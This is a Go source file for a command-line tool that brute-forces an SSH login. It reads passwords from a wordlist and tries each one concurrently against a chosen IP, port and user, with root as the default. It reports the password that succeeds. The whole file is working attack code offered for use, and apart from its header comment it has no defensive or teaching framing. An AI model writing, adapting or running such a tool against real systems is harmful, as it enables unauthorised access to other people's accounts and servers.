/**
* @Author: Aldo Sotolongo
* @Date:   2016-06-20T14:12:18-04:30
* @Email:  aldenso@gmail.com
* @Last modified by:   Aldo Sotolongo
* @Last modified time: 2016-06-20T15:26:13-04:30
golang program to find a password for a ssh user using a large wordlist file.
TODO: add args to check if the ip is down and create a results file.
*/

package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"strconv"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	inittime     = time.Now()
	passwordfile = flag.String("file", "wordlistfile.txt", "indicate wordlist file to use")
	ip           = flag.String("ip", "192.168.125.100", "indicate the ip address to brute force")
	port         = flag.Int("port", 22, "indicate port to brute force")
	user         = flag.String("user", "root", "indicate user to brute force")
	// don't set timer to low, you may bypass the right password, for me it works with 150ms.
	timer = flag.Duration("timer", 200*time.Millisecond, "set timeout to ssh dial response (ex:300ms), don't set this too low")
)

type resp struct {
	Error error
	mu    sync.Mutex
}

// Define fileScanner with methods
type fileScanner struct {
	File    *os.File
	Scanner *bufio.Scanner
}

func newFileScanner() *fileScanner {
	return &fileScanner{}
}

func (f *fileScanner) Open(path string) (err error) {
	f.File, err = os.Open(path)
	return err
}

func (f *fileScanner) Close() error {
	return f.File.Close()
}

func (f *fileScanner) GetScan() *bufio.Scanner {
	if f.Scanner == nil {
		f.Scanner = bufio.NewScanner(f.File)
		f.Scanner.Split(bufio.ScanLines)
	}
	return f.Scanner
}

func sshdialer(password string) *resp {
	salida := &resp{}
	config := &ssh.ClientConfig{
		User: *user,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		Timeout: *timer,
	}
	//Create dial
	_, err := ssh.Dial("tcp", *ip+":"+strconv.Itoa(*port), config)
	if err != nil {
		fmt.Printf("Failed: %s ---", password)
	} else {
		end := time.Now()
		d := end.Sub(inittime)
		duration := d.Seconds()
		fmt.Printf("\n+++ Pattern found: %s +++\n", password)
		fmt.Printf("\nCompleted in %v senconds\n", strconv.FormatFloat(duration, 'g', -1, 64))
	}
	salida.Error = err
	return salida
}

func printUsedValues() {
	fmt.Println("file:", *passwordfile)
	fmt.Println("ip:", *ip)
	fmt.Println("port:", *port)
	fmt.Println("user:", *user)
	fmt.Println("timer:", timer)
	fmt.Println("additional args:", flag.Args())
}

func main() {
	flag.Parse()
	printUsedValues()
	fscanner := newFileScanner()
	err := fscanner.Open(*passwordfile)
	if err != nil {
		fmt.Println("error in open file step: ", err.Error())
	}
	scanner := fscanner.GetScan()
	for scanner.Scan() {
		password := scanner.Text()
		go func() {
			resp := sshdialer(password)
			resp.mu.Lock()
			if resp.Error == nil {
				fmt.Println("+++ FOUND IT +++")
				fscanner.Close()
				resp.mu.Unlock()
				os.Exit(0)
			}
		}()
		time.Sleep(*timer)
	}
}
